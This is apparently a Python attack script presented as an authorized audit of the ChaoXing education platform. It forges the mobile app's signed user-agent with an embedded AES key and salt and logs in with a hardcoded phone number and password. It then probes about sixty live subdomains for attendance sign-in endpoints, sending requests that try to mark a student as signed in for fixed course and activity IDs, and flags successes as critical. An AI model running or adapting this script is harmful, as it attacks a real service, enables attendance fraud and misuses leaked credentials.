#!/usr/bin/env python3
"""
Authorized Security Audit - ChaoXing Sign-in API Exploration
Tiers 9-11 Batch Domain Testing
"""
import base64, hashlib, json, uuid, requests, urllib3, time, sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

SIGN_PATHS = [
    "/pptSign/updateSignStatus",
    "/pptSign/updateSignStatusByUidsV2",
    "/pptSign/refeashSignList4Json2",
    "/pptSign/stuSignajax",
    "/newsign/updateSignStatus",
    "/widget/sign/pcTeaSignController/updateSignStatus2",
    "/v2/apis/sign/signIn",
    "/mooc-ans/pptSign/updateSignStatusByUidsV2",
]

def get_sign_params(uid):
    return {
        "activeId": "5000163891319",
        "uid": uid,
        "courseId": "257485372",
        "classId": "132821141",
        "signType": "0",
        "clientType": "1",
    }

# All domains for Tiers 9-11
DOMAINS = [
    # Tier 9
    "exportyd.chaoxing.com",
    "previewyd.chaoxing.com",
    "wordyd.chaoxing.com",
    "convertservice.chaoxing.com",
    "transyd.chaoxing.com",
    "merger.yd.chaoxing.com",
    "commendyd.chaoxing.com",
    "cooperateyd.chaoxing.com",
    "contestyd.chaoxing.com",
    "imageproxy.chaoxing.com",
    "x.chaoxing.com",
    "wx.chaoxing.com",
    "passport2.chaoxing.com",
    "sso.chaoxing.com",
    # Tier 10
    "ai.chaoxing.com",
    "airead.chaoxing.com",
    "aivideo.chaoxing.com",
    "kb.chaoxing.com",
    "meeting.chaoxing.com",
    "live.chaoxing.com",
    "live.superlib.com",
    "zhibo.chaoxing.com",
    "intellectual-education-k8s.chaoxing.com",
    "ktlog.chaoxing.com",
    "wps.chaoxing.com",
    "jcuc.chaoxing.com",
    "jcxygl.chaoxing.com",
    # Tier 11
    "paycenter.fanya.chaoxing.com",
    "fanya.zyk2.chaoxing.com",
    "fanyalubodata.fanya.chaoxing.com",
    "fystat1-1.fy.chaoxing.com",
    "astats.fy.chaoxing.com",
    "gdhydx.jxjy.chaoxing.com",
    "cjkt.jxjy.chaoxing.com",
    "hust.fanya.chaoxing.com",
    "mbti.basicedu.chaoxing.com",
    "ss.chaoxing.com",
    "ss.zhizhen.com",
    "auth.zhizhen.com",
    "ketang-zhizhen.chaoxing.com",
    "qikan.chaoxing.com",
    "16q.cn",
    "sms.chaoxing.com",
    "swfilter.chaoxing.com",
    "cv-p.chaoxing.com",
    "vspace.chaoxing.com",
    "ypdownload.chaoxing.com",
    "edas.chaoxing.com",
    "jwdatatb.chaoxing.com",
    "jwdatatb.fy.chaoxing.com",
    "specie.chaoxing.com",
    "rec2.chaoxing.com",
    "recv1-tongxueshe.chaoxing.com",
    "robot.chaoxing.com",
    "robot-lc.chaoxing.com",
    "pan-yz.chaoxing.com",
    "d0.ananas.chaoxing.com",
    "d0.cldisk.com",
    "p2.ananas.chaoxing.com",
    "p.cldisk.com",
    "photo.chaoxing.com",
    "cs.ananas.chaoxing.com",
]

def test_domain_alive(domain):
    """Test if domain is reachable via HTTPS or HTTP"""
    for scheme in ["https", "http"]:
        url = f"{scheme}://{domain}/"
        try:
            r = requests.get(url, timeout=8, verify=False, allow_redirects=True)
            return True, scheme, r.status_code, r.text[:500] if r.text else ""
        except requests.exceptions.SSLError:
            continue
        except requests.exceptions.ConnectionError:
            continue
        except requests.exceptions.Timeout:
            continue
        except Exception as e:
            continue
    return False, None, None, None

def test_sign_paths(domain, session, uid):
    """Test sign-in API paths on a domain"""
    results = []
    params = get_sign_params(uid)
    
    for path in SIGN_PATHS:
        url = f"https://{domain}{path}"
        # GET test
        try:
            r = session.get(url, params=params, timeout=8, verify=False, allow_redirects=False)
            status = r.status_code
            body = r.text[:1000] if r.text else ""
            is_sign_related = any(kw in body.lower() for kw in ["sign", "签到", "activeid", "status", "success", "result", "error", "uid"])
            results.append({
                "path": path, "method": "GET", "status": status,
                "body_preview": body[:300], "sign_related": is_sign_related,
                "url": url
            })
            # If non-404, also test POST
            if status != 404:
                try:
                    r2 = session.post(url, data=params, timeout=8, verify=False, allow_redirects=False)
                    body2 = r2.text[:1000] if r2.text else ""
                    is_sign_related2 = any(kw in body2.lower() for kw in ["sign", "签到", "activeid", "status", "success", "result", "error", "uid"])
                    results.append({
                        "path": path, "method": "POST", "status": r2.status_code,
                        "body_preview": body2[:300], "sign_related": is_sign_related2,
                        "url": url
                    })
                except:
                    pass
        except requests.exceptions.SSLError:
            # Try HTTP
            url_http = f"http://{domain}{path}"
            try:
                r = session.get(url_http, params=params, timeout=8, verify=False, allow_redirects=False)
                status = r.status_code
                body = r.text[:1000] if r.text else ""
                is_sign_related = any(kw in body.lower() for kw in ["sign", "签到", "activeid", "status", "success", "result", "error", "uid"])
                results.append({
                    "path": path, "method": "GET(HTTP)", "status": status,
                    "body_preview": body[:300], "sign_related": is_sign_related,
                    "url": url_http
                })
            except:
                pass
        except:
            pass
    
    return results

def is_critical_response(result):
    """Check if a response indicates critical sign-in modification capability"""
    body = result.get("body_preview", "").lower()
    status = result.get("status", 0)
    path = result.get("path", "")
    
    # Check for successful sign-in modification
    if status == 200 and result.get("sign_related"):
        # Look for success indicators
        if any(kw in body for kw in ['"result":1', '"success":true', '"status":0', '签到成功', '已签到', 'signed']):
            return True
        # updateSignStatus paths are inherently critical if they return 200
        if "updateSignStatus" in path and status == 200:
            return True
        if "stuSignajax" in path and status == 200:
            return True
        if "signIn" in path and status == 200:
            return True
    return False

def main():
    print("=" * 80)
    print("ChaoXing Sign-in API Security Audit - Tiers 9-11")
    print("=" * 80)
    
    # Login as student
    print("\n[*] Logging in as student...")
    stu_session, stu_puid = login("18436633997", "3.1415926Cpy")
    print(f"    Student PUID: {stu_puid}")
    
    if not stu_puid:
        print("[!] Failed to get student PUID, using fallback 431407443")
        stu_puid = "431407443"
    
    # Phase 1: Test domain accessibility in parallel
    print(f"\n[*] Phase 1: Testing {len(DOMAINS)} domains for accessibility...")
    alive_domains = {}
    dead_domains = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_domain = {executor.submit(test_domain_alive, d): d for d in DOMAINS}
        for future in as_completed(future_to_domain):
            domain = future_to_domain[future]
            try:
                alive, scheme, status, body = future.result()
                if alive:
                    alive_domains[domain] = {"scheme": scheme, "status": status, "body_preview": body[:200]}
                    print(f"  [+] {domain} - ALIVE ({scheme}, status={status})")
                else:
                    dead_domains.append(domain)
                    print(f"  [-] {domain} - UNREACHABLE")
            except Exception as e:
                dead_domains.append(domain)
                print(f"  [-] {domain} - ERROR: {e}")
    
    print(f"\n[*] Alive: {len(alive_domains)}, Dead: {len(dead_domains)}")
    
    # Phase 2: Test sign-in paths on alive domains
    print(f"\n[*] Phase 2: Testing sign-in API paths on {len(alive_domains)} alive domains...")
    all_findings = {}
    critical_findings = []
    
    for domain in alive_domains:
        print(f"\n  [*] Testing {domain}...")
        results = test_sign_paths(domain, stu_session, stu_puid)
        
        interesting = [r for r in results if r.get("sign_related") or r.get("status") not in (None, 404, 0)]
        if interesting:
            all_findings[domain] = interesting
            for r in interesting:
                critical = is_critical_response(r)
                marker = "🔴 CRITICAL" if critical else "🟡 INTERESTING"
                print(f"    {marker} {r['method']} {r['path']} -> {r['status']}")
                print(f"      Body: {r['body_preview'][:150]}")
                if critical:
                    critical_findings.append({"domain": domain, **r})
        else:
            print(f"    No interesting results")
    
    # Phase 3: Special domain exploration for interesting ones
    special_domains = ["passport2.chaoxing.com", "sso.chaoxing.com", "x.chaoxing.com", 
                       "wx.chaoxing.com", "ketang-zhizhen.chaoxing.com",
                       "intellectual-education-k8s.chaoxing.com", "jcxygl.chaoxing.com",
                       "jwdatatb.chaoxing.com"]
    
    print(f"\n[*] Phase 3: Deep exploration of special domains...")
    for domain in special_domains:
        if domain not in alive_domains:
            continue
        print(f"\n  [*] Deep exploring {domain}...")
        
        # Test additional paths
        extra_paths = [
            "/api/sign/list",
            "/api/sign/status",
            "/api/active/list",
            "/api/course/sign",
            "/sign/",
            "/api/",
            "/v2/",
            "/mooc-ans/",
            "/widget/sign/",
            "/pptSign/",
            "/newsign/",
        ]
        
        for path in extra_paths:
            for scheme in ["https", "http"]:
                url = f"{scheme}://{domain}{path}"
                try:
                    r = stu_session.get(url, timeout=8, verify=False, allow_redirects=False)
                    if r.status_code not in (404, 0):
                        body_preview = r.text[:300] if r.text else ""
                        is_sign = any(kw in body_preview.lower() for kw in ["sign", "签到", "activeid", "course"])
                        marker = "🟡" if is_sign else "ℹ️"
                        print(f"    {marker} GET {path} ({scheme}) -> {r.status_code}: {body_preview[:100]}")
                except:
                    pass
    
    # Summary Report
    print("\n" + "=" * 80)
    print("SUMMARY REPORT - Tiers 9-11")
    print("=" * 80)
    
    print(f"\n📊 Domain Accessibility Summary:")
    print(f"  Total domains tested: {len(DOMAINS)}")
    print(f"  Alive domains: {len(alive_domains)}")
    print(f"  Dead domains: {len(dead_domains)}")
    
    print(f"\n📋 Alive Domains Detail:")
    for domain, info in sorted(alive_domains.items()):
        scheme = info['scheme']
        status = info['status']
        print(f"  {domain:50s} {scheme:5s} status={status}")
    
    print(f"\n🔍 Domains with Sign-in Related Findings:")
    if all_findings:
        for domain, findings in sorted(all_findings.items()):
            print(f"\n  {domain}:")
            for f in findings:
                critical = is_critical_response(f)
                marker = "🔴 CRITICAL" if critical else "🟡 INTERESTING"
                print(f"    {marker} {f['method']:8s} {f['path']:55s} -> {f['status']}")
                print(f"           Body: {f['body_preview'][:120]}")
    else:
        print("  None found")
    
    print(f"\n🔴 CRITICAL Findings (Student can modify sign-in):")
    if critical_findings:
        for cf in critical_findings:
            print(f"  ⚠️  {cf['domain']} {cf['method']} {cf['path']} -> {cf['status']}")
            print(f"      Body: {cf['body_preview'][:200]}")
    else:
        print("  No critical findings")
    
    # Dead domains list
    print(f"\n💀 Unreachable Domains ({len(dead_domains)}):")
    for d in dead_domains:
        print(f"  - {d}")
    
    # Save detailed results to JSON
    output = {
        "alive_domains": {k: v for k, v in alive_domains.items()},
        "dead_domains": dead_domains,
        "findings": {k: v for k, v in all_findings.items()},
        "critical_findings": critical_findings,
    }
    
    with open("/workspace/tier9_11_results.json", "w", encoding="utf-8") as f:
        json.dump(output, f, ensure_ascii=False, indent=2, default=str)
    
    print(f"\n✅ Detailed results saved to /workspace/tier9_11_results.json")

if __name__ == "__main__":
    main()
